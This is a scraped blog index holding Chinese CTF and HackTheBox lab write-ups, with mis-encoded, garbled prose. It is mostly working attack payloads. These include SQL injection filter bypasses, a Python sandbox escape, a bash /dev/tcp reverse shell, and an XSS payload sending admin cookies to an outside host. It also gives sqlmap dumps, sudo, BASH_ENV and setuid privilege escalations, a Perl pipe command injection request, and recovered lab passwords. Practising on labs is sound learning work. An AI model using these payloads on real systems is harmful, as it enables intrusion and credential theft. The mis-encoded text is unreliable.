1||(updatexml(1,concat(0x7e,(select(database()))),1))||1=11||(updataxml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=security))))||1=11||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=security))),1))||1=11||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=security))),1))||1=11||(updatexml(1,concat(1,(select(group_concat(passwoorrd,username))from(users))),1))||1=1 level_27è¿‡æ»¤äº†select SELECT Select union UNION Union * # â€“ + ç©ºæ ¼å¯ä»¥ç”¨%09å’Œ%0aæ›¿ä»£ selectç”¨sElect 1and%09updatexml(1,concat(1,(sElect%09database())),1)%0aand1=1 level_28* â€“ + ç©ºæ ¼ è¿‡æ»¤union select è¿™ä¸ªç»„åˆ ç©ºæ ¼ç”¨ç¼–ç  æ³¨é‡Šç”¨è¡¨è¾¾å¼ç­‰å¼ union selectç»„åˆç»•è¿‡ uniunion%0Aselecton%0Aselect%0A -1)uniunion%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=securityand (1 level_29è€ƒç‚¹;httpå‚æ•°æ±¡æŸ“æ¥è¿›è¡Œæ³¨å…¥ tomcatåªè§£æé‡å¤å‚æ•°é‡Œé¢çš„å‰è€…ï¼Œè€ŒApacheåªè§£æé‡å¤å‚æ•°é‡Œé¢çš„åè€…ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸¤ä¸ªidå‚æ•°ï¼Œå‰è€…åˆæ³•è€Œåè€…ä¸ºæˆ‘ä»¬æƒ³æ³¨å…¥çš„å†…å®¹,æˆ‘ä»¬çš„åç«¯æ˜¯apacheï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦å°†å‚æ•°æ”¾åœ¨åé¢å³å¯ã€‚ payload: ?id=1id=-1 union select 1,database(),3 --+?id=1id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ä»¥æ­¤ç±»æ¨ level_30é—­åˆæ–¹å¼æ”¹ä¸ºâ€ å…¶ä»–å’Œ29ä¸€æ · level_31é—­åˆæ–¹å¼ä¸ºâ€™) å…¶ä»–å’Œ29ä¸€æ · level_32å®½å­—èŠ‚æ³¨å…¥åŸç†: ä¸€ä¸ªgbkç¼–ç æ±‰å­—ï¼Œå ç”¨2ä¸ªå­—èŠ‚ã€‚ ä¸€ä¸ªutf-8ç¼–ç çš„æ±‰å­—ï¼Œå ç”¨3ä¸ªå­—èŠ‚ã€‚ addslasheså‡½æ•°çš„ä½œç”¨å°±æ˜¯è®©â€™å˜æˆï¼Œè®©å¼•å·å˜å¾—ä¸å†æ˜¯åŸæœ¬çš„â€œå•å¼•å·â€ï¼Œæ²¡æœ‰äº†ä¹‹å‰çš„è¯­ä¹‰ï¼Œè€Œæ˜¯å˜æˆäº†ä¸€ä¸ªå­—ç¬¦ã€‚é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨è¦åšçš„å°±æ˜¯æƒ³åŠæ³•å°†â€™å‰é¢çš„\\ç»™å®ƒå»é™¤æ‰ï¼šæ—¢ç„¶è¿™å‡½æ•°ç»™â€™å‰é¢åŠ äº†ä¸€ä¸ª\\é‚£ä¹ˆæ˜¯ä¸æ˜¯æƒ³åŠæ³•ç»™\\å‰é¢å†åŠ ä¸€ä¸ª\\ï¼ˆæˆ–å•æ•°ä¸ªå³å¯ï¼‰ï¼Œç„¶åå˜æˆäº†\\â€˜ï¼Œè¿™æ ·\\å°±åˆè¢«è½¬ä¹‰äº†ï¼Œè¿™æ ·å°±æˆåŠŸçš„é€ƒå‡ºäº†addslashesçš„é™åˆ¶ â€˜å‰é¢åŠ %df ç„¶åæ­£å¸¸æ³¨å…¥ -1%df union select 1,2,database()--+ çŸ¥è¯†ç‚¹ç©ºæ ¼ç»•è¿‡åœ¨dockerä¸­ï¼Œç©ºæ ¼å¯ä»¥ç”¨è½¬ä¹‰ç¬¦%a0ä»£æ›¿ã€‚ æŠ€å·§æ¥æºé¢˜ç›®ï¼š[SWPU2019]Web1-CSDNåšå®¢ 1/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=web1 è¿™æ ·å¯ä»¥ä¸ç”¨information ç»•è¿‡å¯¹orçš„é™åˆ¶ 1/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 å·²ç»çŸ¥é“è¡¨åçš„æƒ…å†µä¸‹å¯ä»¥é‡‡ç”¨æ— åˆ—åçˆ†ç ´æ³• æ™®é€šçš„sqæŸ¥è¯¢select * from usersæŸ¥è¯¢è¡¨ï¼Œå¹¶æŠŠåˆ—åæ›¿æ¢ä¸º1ï¼Œ2ï¼Œ3.4ï¼Œ5ï¼Œ6select 1,2,3,4,5 ,6 union select * from userså•ç‹¬æŠŠç¬¬å››åˆ—æå‡ºæ¥ï¼Œ(select 1,2,3,4,5,6 union select * from users)aç»™æŸ¥è¯¢ç»“æœå‘½å select `4` from (select 1,2,3,4,5,6 union select * from users)a;è‹¥åå¼•å·è¢«è¿‡æ»¤ï¼Œå¯ä»¥è¿™æ ·select b from (select 1,2,3 as b,4,5 union select * from users)a;æµ‹è¯•:-- åœ¨å·²ç»çŸ¥é“beanbookè¡¨ï¼Œä½†æ˜¯ä¸çŸ¥é“å…¶å­—æ®µåçš„æƒ…å†µä¸‹ï¼Œçˆ†å‡ºè¯¥è¡¨çš„å­—æ®µå€¼-- çˆ†å‡ºç¬¬3åˆ—çš„å€¼,æŠŠ3å½“ä½œç¬¬ä¸‰åˆ—çš„å­—æ®µåselect `3` from (select 1,2,3,4,5,6 union select * from beanbook) as b-- çˆ†å‡ºç¬¬1åˆ—çš„å€¼ï¼ŒæŠŠåˆ«åaå½“ä½œç¬¬ä¸€åˆ—çš„å­—æ®µåselect a from (select 1 as a,2,3,4,5,6 union select * from beanbook) as b è§£é‡Šæ¥æºï¼š[BUUCTF_WEB_[SWPU2019]Web1 é¢˜è§£ - South](","tags":["CTF-wp"]},{"title":"HTB-wp-é•¿æœŸæ›´æ–°","path":"/2010/01/22/HTB-Practice/","content":"HTB-codeusernmapæ‰«æ nmap 10.10.11.62 -sV -A å‘ç°å¼€æ”¾äº†5000ç«¯å£ è®¿é—®å‘ç°æ˜¯ä¸ªåœ¨çº¿æ‰§è¡Œpythonä»£ç çš„ç½‘é¡µ å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ print(.__class__.__base__.__subclasses__()[317](ls /,shell=True,stdout=-1).communicate()[0].strip()) ç„¶åç›´æ¥åœ¨ä¸Šå±‚ç›®å½•è¯»åˆ°user.txt print(.__class__.__base__.__subclasses__()[317](cat ../user.txt,shell=True,stdout=-1).communicate()[0].strip()) rootå‘½ä»¤æ‰§è¡Œ print(.__class__.__base__.__subclasses__()[317](ls *,shell=True,stdout=-1).communicate()[0].strip())#bapp.pyinstance: database.db __pycache__: app.cpython-38.pyc static: css templates: about.html codes.html index.html login.html register.html å‘ç°æœ‰instanceä¸‹æœ‰database.db è¯»ä¸€ä¸‹è¯•è¯•çœ‹ äºæ˜¯å¯ä»¥æ‹¿åˆ° martinçš„hashåŠ å¯†åçš„å¯†ç  3de6f30c4a09c27fc71932bfc68474be å°±æ˜¯ nafeelswordsmaster ç„¶åä½¿ç”¨sshç™»å½• ssh martin@10.10.11.62 æç¤ºè¾“å…¥å¯†ç  è¾“å…¥å°±å¥½äº† è¾“å…¥sudo -l å›æ˜¾ martin@code:~$ sudo -lMatching Defaults entries for martin on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser martin may run the following commands on localhost: (ALL : ALL) NOPASSWD: /usr/bin/backy.sh backy.shæ–‡ä»¶å†…å®¹ï¼š å†…å®¹å¤§æ¦‚ä¸ºä¸‰ä¸ªåŠŸèƒ½ï¼š1.è¾“å…¥æ£€æŸ¥ï¼Œå¿…é¡»ä¼ å…¥ä¸€ä¸ª JSON æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚ task.jsonï¼‰ï¼Œå¦åˆ™æŠ¥é”™ã€‚æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚2.è·¯å¾„è¿‡æ»¤ä½¿ç”¨,jq ç§»é™¤ directories_to_archive ä¸­æ‰€æœ‰ ..ï¼ˆé˜²æ­¢ç›®å½•éå†æ”»å‡»ï¼‰ã€‚å…è®¸çš„è·¯å¾„èŒƒå›´é™å®šåœ¨ var å’Œ homeã€‚3.è·¯å¾„æƒé™æ£€æŸ¥,is_allowed_path() å‡½æ•°æ£€æŸ¥è·¯å¾„æ˜¯å¦ä»¥ var æˆ– home å¼€å¤´ï¼ˆé˜²æ­¢è®¿é—®æ•æ„Ÿè·¯å¾„å¦‚ rootï¼‰ã€‚ #!/bin/bashif [[ $# -ne 1 ]]; then /usr/bin/echo Usage: $0 task.json exit 1fijson_file=$1if [[ ! -f $json_file ]]; then /usr/bin/echo Error: File $json_file not found. exit 1fiallowed_paths=(/var/ /home/)updated_json=$(/usr/bin/jq .directories_to_archive |= map(gsub(\\\\.\\\\./; )) $json_file)/usr/bin/echo $updated_json $json_filedirectories_to_archive=$(/usr/bin/echo $updated_json | /usr/bin/jq -r .directories_to_archive[])is_allowed_path() local path=$1 for allowed_path in $allowed_paths[@]; do if [[ $path == $allowed_path* ]]; then return 0 fi done return 1for dir in $directories_to_archive; do if ! is_allowed_path $dir; then /usr/bin/echo Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed. exit 1 fidone/usr/bin/backy $json_file task.json å…¶ä¸»è¦åŠŸèƒ½æ˜¯è¿‡æ»¤è·¯å¾„å¹¶æ£€æŸ¥å…è®¸çš„ç›®å½•ï¼Œå…ˆæ‰§è¡Œä¸€ä¸‹backy.shï¼Œå‘ç°ä¼šç”Ÿæˆä¸€ä¸ªå‹ç¼©åŒ… destination: /home/martin/backups/, multiprocessing: true, verbose_log: false, directories_to_archive: [ /home/app-production/app ], exclude: [ .* ] åšæ³•ï¼šå°†å¤‡ä»½ç›®å½•ä¿®æ”¹ä¸ºhomeâ€¦.root å¹¶ä¸”è¦åˆ é™¤exclude: [â€œ.*â€] ä¸ºä»€ä¹ˆè¦åˆ é™¤ï¼Ÿexclude: [.*]å¯¼è‡´/rootæ–‡ä»¶å¤¹è¢«å®Œå…¨æ’é™¤ destination: /home/martin/backups/, multiprocessing: true, verbose_log: false, directories_to_archive: [ /home/....//root ] sudo /usr/bin/backy.sh task.json æ‰§è¡Œls å‘ç°ç”Ÿæˆäº†å‹ç¼©åŒ… ä½¿ç”¨tar -xjf code_home_.._root_2025_April.tar.bz2 å†ls å‘ç°ç”Ÿæˆäº†rootç›®å½• è¿›rootç›®å½•è¯»root.txtå³å¯ HTB-Environmentæƒ¯ä¾‹nmapå…ˆæ‰«æ10.10.11.67 nmap 10.10.11.67 -sV -A æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ å¸¸è§çš„22å’Œ80ç«¯å£ ç›´æ¥è®¿é—® è®°å¾—é…host echo 10.10.11.67 environment.htb | sudo tee -a /etc/hosts è®¿é—®å è¿›å…¥ç½‘ç«™ç•Œé¢ æ²¡å‘ç°ä»€ä¹ˆç‰¹åˆ«çš„ ä¹Ÿæ²¡æœ‰å¯ä»¥ç‚¹çš„ä¸œè¥¿ ä¸Šdirsearchæ‰«æçœ‹çœ‹ æ‰«å‡ºæ¥ç™»å½•è·¯ç”± è¿›å»å°è¯•ç™»å½• å‘ç°æ²¡ä»€ä¹ˆç”¨ æŠ“åŒ…ä¸‹ç™»å½•ç•Œé¢ æ”¹ä¸‹å‚æ•°å°±å‡ºäº†æŠ¥é”™ç•Œé¢ (è¿™ä¸€æ­¥æˆ‘æ˜¯çœ‹wpæ‰çŸ¥é“çš„ å‘Šè¯‰æˆ‘ä»¬è¦å¤šè¯•è¯•) user $keep_loggedin = False; elseif ($remember == True) $keep_loggedin = True;if($keep_loggedin !== False) // TODO: Keep user logged in if he selects Remember Me?if(App::environment() == preprod) //QOL: login directly as me in dev/local/preprod envs $request-session()-regenerate(); $request-session()-put(user_id, 1); return redirect(/management/dashboard);$user = User::where(email, $email)-first(); ç„¶åè¿™é‡Œå°±æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹äº† if(App::environment() == preprod) $request-session()-regenerate(); $request-session()-put(user_id, 1); return redirect(/management/dashboard); è¿™ä¸€æ®µä»£ç æ„æ€æ˜¯ :å½“è¿è¡Œç¯å¢ƒä¸º preprod æ—¶ï¼Œç›´æ¥æŠŠ session ä¸­çš„ user_id è®¾ç½®ä¸º 1ï¼Œå¹¶é‡å®šå‘åˆ°åå°(å¸¸å¸¸ç”¨äºå¼€å‘è€…æƒ³å·æ‡’ç›´æ¥è®©è‡ªå·±ç™»é™†çš„) æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³ç™»å½•æ»¡è¶³è¿™ä¸ªå°±å¥½ æ‰¾åˆ°ç›¸å…³çš„CVE â€œhttps://github.com/Nyamort/CVE-2024-52301â€œ æŒ‰ç…§pocå»æ‰“äºæ˜¯æˆåŠŸè¿›å…¥åå°äº†ï¼ åœ¨profileé‡Œæ‰¾åˆ°ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ç‚¹ è¿›è¡Œç»•è¿‡ åŠ GIF89a ä»¥åŠåç¼€åŠ ä¸€ä¸ª. ä¸Šä¼ æ–‡ä»¶æˆåŠŸï¼ç„¶åè¿æ¥antsword ç„¶åå°±å¯ä»¥æ‹¿åˆ°ç¬¬ä¸€ä¸ªflagäº† rootç„¶åå…¶å®æœ€å¥½çš„åšæ³•æ˜¯åå¼¹shell æ¥ä¸‹æ¥æˆ‘ä»¬æ‰“rootä¹Ÿæ–¹ä¾¿ cmdbash+-c+%27bash+-i+%3E%26+devtcpip1234+0%3E%261%27 åå¼¹shellæˆåŠŸååˆ‡æ¢åˆ° homehishç›®å½• å‘ç°äº†.gnupgç›®å½• æ­¤æ—¶www-dataç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™å¯¹hishç”¨æˆ·è¿›è¡Œè§£å¯†çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•å¤åˆ¶hishç”¨æˆ·çš„gpgç§é’¥è¿›è¡Œè§£å¯† .gnupg æ˜¯ GnuPGï¼ˆGPGï¼‰ çš„é…ç½®ä¸å¯†é’¥ç›®å½•ï¼Œç”¨äºç®¡ç†ç”¨æˆ·çš„åŠ å¯†å¯†é’¥ã€é…ç½®æ–‡ä»¶ã€ç¼“å­˜ç­‰æ•°æ®ã€‚ GPG æ˜¯ GNU çš„ PGP å®ç°ï¼Œä¸»è¦ç”¨äºï¼šåŠ å¯†/è§£å¯†æ–‡ä»¶ç­¾åæ–‡ä»¶/éªŒè¯ç­¾åç”Ÿæˆ/å¯¼å…¥/ç®¡ç†åŠ å¯†å¯†é’¥ é¦–å…ˆæŠŠè¿™ä¸ªæ–‡ä»¶å¤‡ä»½åˆ°å…¶ä»–ç›®å½• cp -r /home/hish/.gnupg/* /tmp/mygpg/ ç„¶åè¿›å…¥backupç›®å½•è¿›è¡Œè§£å¯† gpg --homedir /tmp/mygpg --decrypt keyvault.gpg up$ gpg --homedir /tmp/mygpg --decrypt keyvault.gpggpg: WARNING: unsafe permissions on homedir /tmp/mygpggpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11 hish_ hish@environment.htbPAYPAL.COM - Ihaves0meMon$yhere123ENVIRONMENT.HTB - marineSPm@ster!!FACEBOOK.COM - summerSunnyB3ACH!! ç„¶åæŒ‰ç…§hishç”¨æˆ·ç™»å½• ç™»é™†è¿‡å sudo -lå¾—åˆ° Matching Defaults entries for hish on environment: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=ENV BASH_ENV, use_ptyUser hish may run the following commands on environment: (ALL) /usr/bin/systeminfo env_keep+=ENV BASH_ENV å…è®¸è®¾ç½® BASH_ENV ç¯å¢ƒå˜é‡ï¼Œå³å…è®¸é€šè¿‡è¯¥å˜é‡åŠ«æŒ bash å¯åŠ¨æ—¶æ‰§è¡Œçš„è„šæœ¬ã€‚ User hish may run the following commands: å¯ä»¥ä½¿ç”¨ sudo è¿è¡Œ /usr/bin/systeminfoï¼ˆä»¥ root æƒé™ï¼‰ ç”¨ sudo æ‰§è¡Œä¸€ä¸ª bash è„šæœ¬ï¼ˆsysteminfoï¼‰ï¼Œè€Œ bash ä¼šè‡ªåŠ¨åŠ è½½ä½ ç”¨ BASH_ENV æ³¨å…¥çš„æ¶æ„è„šæœ¬ï¼Œä»è€Œå®ç°ä»¥ root æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ï¼ ä½¿ç”¨å‘½ä»¤ echo exec /bin/bash /tmp/exploit.shsudo BASH_ENV=/tmp/exploit.sh /usr/bin/systeminfo//è¾“å…¥marineSPm@ster!! å³å¯æˆåŠŸç™»å½• HTB-Catè¿˜æ˜¯nmapå…ˆæ‰«æ æ­£å¸¸å¼€æ”¾22å’Œ80ç«¯å£ é…ä¸ªhostå…ˆ echo 10.10.11.53 cat.htb | sudo tee -a /etc/hosts è®¿é—®æ˜¯ä¸ªç½‘ç«™ æœ‰æ³¨å†Œç‚¹ ç™»é™†è¿›å»æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ å°è¯•äº†ä¸‹å‘ç°æ²¡æœ‰å¯åˆ©ç”¨çš„ç‚¹ å› ä¸ºæ˜¯ç™½åå• åªèƒ½ä¼ å›¾ç‰‡ äºæ˜¯dirsearchç»§ç»­ä¿¡æ¯æ”¶é›† ç»“æœæ‰«å‡ºæ¥ä¸€å †.gitçš„ç›®å½• userä½¿ç”¨Githackè·å–æºä»£ç  ç„¶åå¼€å§‹å®¡è®¡å§ æœ‰å¾ˆå¤šä¸ªphpæ–‡ä»¶ ä½†æ˜¯å…¶å®è·Ÿæˆ‘ç°åœ¨åšçš„ç½‘ç«™æœ‰å…³çš„åªæœ‰éƒ¨åˆ† å‰©ä¸‹çš„æ¯”å¦‚admim.php accept_cat.php ç­‰ æˆ‘ä»¬æš‚æ—¶åœ¨ç½‘ç«™ä¸­è¿˜æ²¡è§åˆ° ä½†æ˜¯ä½ å®¡è®¡è¿™äº›ä»£ç åå°±ä¼šå‘ç° è¿™ä¸ªç½‘ç«™è¿˜æœ‰ä¸€ä¸ªadminçš„å­˜åœ¨å¹¶ä¸”ä½¿ç”¨sessionæ¥éªŒè¯æ˜¯å¦ä¸ºadmin å½“ä½ ä¸Šä¼ ä½ çš„çŒ«å„¿èµ„æ–™è¿‡å adminä¼šæ¥æŸ¥çœ‹ å®ƒå¯ä»¥è¿›è¡ŒæŸ¥çœ‹ æ¥æ”¶ æ‹’ç»çš„æ“ä½œ(å¯¹åº”ä¸‰ä¸ªphpä»£ç ) æ‰€ä»¥æˆ‘ä»¬å¾ˆå®¹æ˜“è”æƒ³åˆ°xssçš„ä¸€ç±»æ”»å‡»æ‰‹æ³• çªƒå–ç®¡ç†å‘˜cookieä¼ªé€ å…¶ç™»å½• è¿™é‡Œå®¡è®¡å‡ºå¤§æ¦‚å­˜åœ¨xss å»è¿™å…­ä¸ªä¸œè¥¿å¯¹åº”çš„phpæ–‡ä»¶ æœ€ç»ˆé”å®šäº†æ³¨å…¥ç‚¹åœ¨ç™»å½•æ¡† æ³¨å†Œå¸å·ä¸ºimg src=x onerror=document.location=http://10.10.14.58/?cookie=+document.cookie / å¯†ç éšä¾¿ è¿›å…¥ä¸Šä¼ çŒ«å’ªèµ„æ–™çš„ç•Œé¢ä¸Šä¼  åŒæ—¶å¼€å¯ç›‘å¬ python3 -m http.server 80 æˆåŠŸæ‹¿åˆ°adminçš„cookieï¼ ä¿®æ”¹cookieåæˆåŠŸè¿›å…¥adminé¡µé¢ æŠ“åŒ… è¿™é‡Œæœ‰sqlæ³¨å…¥æ¼æ´ ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥ å°†reqeustä¿å­˜ä¸º1.txt ç„¶åä½¿ç”¨sqlmapæ³¨å…¥å¾—åˆ°æ•°æ®åº“ sqlmap -r request.txt -p catName --dbms sqlite --level 5 --risk 3 --tables --threads 10 --batchsqlmap -r request.txt -p catName --dbms sqlite --level 5 --risk 3 -T users --dump --threads 10 --batch ç”±æºç çŸ¥é“ä½¿ç”¨axelç™»å½• ä½†æ˜¯è¿™ä¸ªå¯†ç æˆ‘æ²¡åŠæ³•ç ´è§£ å°è¯•årosaçš„å¯†ç å¯ä»¥çŸ¥é“ ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa ç™»å½•åˆ°è¿™ä¸ªç”¨æˆ· ä½†æ˜¯æˆ‘ä»¬çš„æ ¸å¿ƒç›®çš„è¿˜æ˜¯ç™»å½•axel æƒ³åŠæ³•æ‹¿åˆ°ä»–çš„å¯†ç  å‘ç°rosa è¿˜å±äº adm ç»„ï¼ˆGID 4ï¼‰ï¼Œé€šå¸¸ç”¨äºç³»ç»Ÿæ—¥å¿—è®¿é—®æƒé™ã€‚æˆ‘ä»¬å»çœ‹çœ‹æ—¥å¿—å§ æ—¥å¿—ä¸€èˆ¬åœ¨varlogä¸‹ ç„¶åæˆåŠŸæ‰¾åˆ°å¯†ç  ä½¿ç”¨sshç™»å½•axelå³å¯ ç„¶ååœ¨ç›®å½•ä¸‹æ‰¾åˆ°user.txtæˆåŠŸè¯»å– rootç™»å½•axelçš„æ—¶æœ‰ è¯´æˆ‘æœ‰é‚®ä»¶ é‚£å°±å»çœ‹çœ‹ä»€ä¹ˆé‚®ä»¶ HTB-Capé¦–å…ˆæ‰«æå‘ç°å¼€æ”¾ 22 21 80ç«¯å£ â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]â””â”€$ nmap 10.10.10.245 sh: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directoryStarting Nmap 7.95 ( https://nmap.org ) at 2026-01-04 01:40 ESTNmap scan report for cap.htb (10.10.10.245)Host is up (0.28s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 21.24 seconds è®¿é—®webç•Œé¢ å‘ç°æ˜¯Colorlib è¿™ä¸ªæ˜¯wordpressçš„ä¸€ä¸ªæ’ä»¶ æœ¬æ¥æˆ‘ä»¥ä¸ºè€ƒçš„æ˜¯wpçš„æ¼æ´ æœå¯»å’Œä½¿ç”¨wpscanæ‰«äº†ä¸€ä¸‹ æ²¡æœ‰ä»€ä¹ˆå‘ç° çœ‹ç½‘ç«™å§ ä»–æœ‰ä¸€ä¸ªä¸‹è½½åŠŸèƒ½ å¯ä»¥ä¸‹è½½æµé‡åŒ… æµé‡åŒ…ä¸‹è½½æ˜¯æœ‰ç¼–å·çš„ ç°åœ¨å°±è€ƒå¯Ÿå¹³å¸¸çš„æ¸—é€èƒ½åŠ› å‘ç°dataä¸‹è½½çš„æ˜¯å¯¹åº”ç¼–å·çš„æµé‡åŒ… é‚£ä¹ˆæˆ‘ä»¬å°è¯•data0 æœç„¶ä¸‹è½½ä¸‹æ¥ä¸€ä¸ªæµé‡åŒ… æŸ¥çœ‹å‘ç° httpå’Œftpæµé‡ åˆšå¥½å‰é¢å¯¹åº”å¼€äº†ftpçš„21ç«¯å£ å¯ä»¥å¾—åˆ°å¸å·å’Œå¯†ç  nathanBuck3tH4TF0RM3! userftpç™»å½• â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]â””â”€$ ftp cap.htbConnected to cap.htb.220 (vsFTPd 3.0.3)Name (cap.htb:kali): nathan331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp dir229 Entering Extended Passive Mode (|||47686|)150 Here comes the directory listing.-r-------- 1 1001 1001 33 Jan 04 02:37 user.txt226 Directory send OK.ftp get user.txtlocal: user.txt remote: user.txt229 Entering Extended Passive Mode (|||37352|)150 Opening BINARY mode data connection for user.txt (33 bytes).100% |***************************************************************************************************************************| 33 555.62 KiB/s 00:00 ETA226 Transfer complete.33 bytes received in 00:00 (0.11 KiB/s)xxxxxxxxxxÂ ftp cap.htbâ”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]â””â”€$ ftp cap.htbConnected to cap.htb.220 (vsFTPd 3.0.3)Name (cap.htb:kali): nathan331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp dir229 Entering Extended Passive Mode (|||47686|)150 Here comes the directory listing.drwxrwxr-x 4 1001 1001 4096 Jan 04 06:13 CVE-2021-4034-main-rw-rw-r-- 1 1001 1001 6457 Jan 04 06:11 CVE-2021-4034-main.zip-rwxrwxrwx 1 1001 1001 975444 Jan 04 06:25 linpeas.shdrwxr-xr-x 3 1001 1001 4096 Jan 04 06:10 snap-r-------- 1 1001 1001 33 Jan 04 02:37 user.txt226 Directory send OK.ftp get user.txtlocal: user.txt remote: user.txt229 Entering Extended Passive Mode (|||37352|)150 Opening BINARY mode data connection for user.txt (33 bytes).100% |***************************************************************************************************************************| 33 555.62 KiB/s 00:00 ETA226 Transfer complete.33 bytes received in 00:00 (0.11 KiB/s) å³å¯æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag rootsshç™»å½• ssh nathan@cap.htb è¿™é‡Œéœ€è¦ææƒ é¦–å…ˆæˆ‘ä½¿ç”¨çš„æ˜¯ find / -perm -u=s -type f 2/dev/null æ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨ linpeas.sh è¿™æ˜¯æ”¶é›†linuxæœºå™¨ä¿¡æ¯çš„ä¸€ä¸ªå·¥å…· ä½¿ç”¨curlä¸‹è½½å³å¯ chmod 777 linpeas.sh./linpeas.sh å°±å¯ä»¥æ‰¾åˆ° Files with capabilities (limited to 50):/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip/usr/bin/ping = cap_net_raw+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep usrbinpython3.8 cap_setuid,cap_net_bind_service+eipcap_setuidï¼šå…è®¸ç¨‹åºä¿®æ”¹ç”¨æˆ·ID è¿™æ„å‘³ç€ Python å¯ä»¥è°ƒç”¨ setuid() ç³»ç»Ÿè°ƒç”¨ æ™®é€šç”¨æˆ·å¯ä»¥è¿è¡Œ Python è„šæœ¬å°†è‡ªå·±å˜æˆ root import osos.setuid(0)os.system(/bin/bash) å³å¯ææƒ","tags":["æ¸—é€å­¦ä¹ "]},{"title":"About","path":"/about/index.html","content":"ä¸€ä½æ­£åœ¨æˆé•¿çš„ web è‹¦æ‰‹ Location: Chengdu, Sichuan Study: æœ¬ç§‘è®¡ç®—æœºåœ¨è¯»ç”Ÿ Amusement: åŠ¨æ¼« æ¸¸æˆ é˜…è¯» çŒ«å’ª o(=â€¢ã‚§â€¢=)m: MzU2MDI1MzU4OQ=="},{"path":"/images/ImaginaryCTF2025.html","content":"ImaginaryCTF2025pearlperlè¯­è¨€å†™çš„ç½‘ç«™ çœ‹æºç ç¦çš„å­—ç¬¦å°±çŸ¥é“æ˜¯å’Œç›®å½•ç©¿è¶Šæœ‰å…³ ä½†æ˜¯ä»–æ˜¯ç¦æ­¢å‡ºç°..çš„ æœç´¢å‘ç° perl openå‡½æ•°å¸¦ä¸Š|å¯ä»¥æ‰§è¡Œå‘½ä»¤ å…·ä½“åŸç†æ–‡ç«  https://www.cnblogs.com/AikN/p/15953194.html open(my $fh, $fullpath) or do $c-send_error(RC_INTERNAL_SERVER_ERROR, Could not open file.);next; ä½†æ˜¯è¿™é‡Œéƒ½åŠ ä¸Šäº†filesè·¯ç”± æ²¡åŠæ³•è·¯å¾„ç©¿è¶Š æˆ‘ä»¬è¯¥æ€ä¹ˆç»•è¿‡å‘¢ æˆ‘æ˜¯çœ‹wpæ‰çŸ¥é“ä½¿ç”¨%0aç»•è¿‡filesçš„é™åˆ¶ æ‰€ä»¥æœ€ç»ˆå‘åŒ…æƒ…å†µ GET /%0Als%20/%7C HTTP/1.1Host: challenge.imxbt.cn:30322Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7Cookie: session=eyJpc19ib3QiOmZhbHNlLCJ1c2VybmFtZSI6ImFkbWluIn0.aRSGKA.3Rkxg5KnEcmq5uTReYToTHW_H0oConnection: keep-alive è¿™æ ·å°±å¯ä»¥å®Œç¾æ‰§è¡Œå‘½ä»¤å•¦"},{"path":"/images/WEBåšé¢˜æƒ…å†µ.html","content":"WEBåšé¢˜æƒ…å†µWEBäººå‘˜didongji91ï¼šé‚“æ´‹æ—­ 